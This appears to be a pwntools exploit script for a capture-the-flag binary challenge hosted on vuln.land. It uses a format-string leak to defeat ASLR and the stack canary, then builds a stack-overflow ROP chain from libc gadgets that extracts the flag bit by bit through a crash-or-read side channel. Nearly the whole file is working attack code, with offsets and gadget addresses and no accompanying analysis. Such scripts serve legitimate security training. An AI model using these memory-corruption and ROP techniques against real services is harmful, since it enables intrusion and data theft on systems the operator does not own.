#!/usr/bin/env python3

from pwn import *

exe = ELF("pwn_patched")
libc = ELF("libc.so.6")
ld = ELF("ld-2.35.so")

context.binary = exe

@context.quietfunc
def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r, gdbscript='''break *main+970
c
''')
    else:
        r = remote('xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx.rdocker.vuln.land', 1337)

    return r

@context.quietfunc
def main():

    def getBit(bit, char):
        r = conn()

        formatPayload = b'%47$p %45$p %43$p' # -> elf, libc, stackcookie
        r.sendlineafter(b'?', formatPayload)
        elfbase, libc, stackcookie = [int(x, 16) - y for x, y in zip(r.recvuntil(b':').split()[4:7], [0x1329, 0x23A90, 0x0])]

        gift = elfbase+0x4540
        flag = 0x6b8b4567500

        read =  0x10E6C0+libc - (0x3E0 if not args.LOCAL else 0)
        strncpy = 0x185520+libc - (0x3E0 if not args.LOCAL else 0)
        pop_rsi = 0x25B51+libc      #: pop rsi ; ret
        pop_rdi = 0x240E5+libc      #: pop rdi ; ret
        pop_rdx =  0x733A2+libc     #: pop rdx ; pop rbx ; ret
        mv_qwrp_rdx = 0xB9960+libc  # mov rdx, qword ptr [rsi] ; mov qword ptr [rdi], rdx ; ret
        and_edx_eax = 0x3B0C3+libc  # and eax, eax; ret
        pop_rax = 0x3FBB0+libc      # pop rax ; ret
        test_rax_rax = 0x84300+libc # 0x00007fcb0228a600 : test rax, rax ; je 0x7fcb0228a610 ; pop rbx ; ret

        # Copy one character with strncpy(retult, flag, 1), and character with number, compare if bigger 0 -> read, otherwise crash
        payload = fit({
            264:stackcookie, 
            280:[pop_rsi, flag+char, 
                 pop_rdi, gift, 
                 pop_rdx, 0x1, 
                 strncpy, 

                 pop_rsi, gift, 
                 pop_rdi, gift, 
                 mv_qwrp_rdx, 
                 
                 pop_rax, 1 << bit, 
                 and_edx_eax, 
                 
                 pop_rdi, 0x0, 
                 test_rax_rax, 0x0,

                 pop_rdx, 0x1, 
                 pop_rdi, 0x0, 
                 pop_rsi, gift, 
                 read, 
                 read
                ]
            })

        r.sendline(payload)
        try:
            for _ in range(4):
                r.sendlineafter(b':', b'a')
        except:
            return getBit(bit, char)

        if args.GDB:
            input('')

        sleep(3)

        try:        # try to detect if process hash crashed or called read
            r.sendline(b'a')
            if not args.LOCAL:
                sleep(1)
                r.sendline(b'a')
            print(f'{bit=} value=1')
            return 1
        except EOFError:
            print(f'{bit=} value=0')
            return 0

    flag = ''
    for n in range(0, 40):
        flag += chr(sum([getBit(i, n) << i for i in range(8)]))
        print(flag)

if __name__ == "__main__":
    main()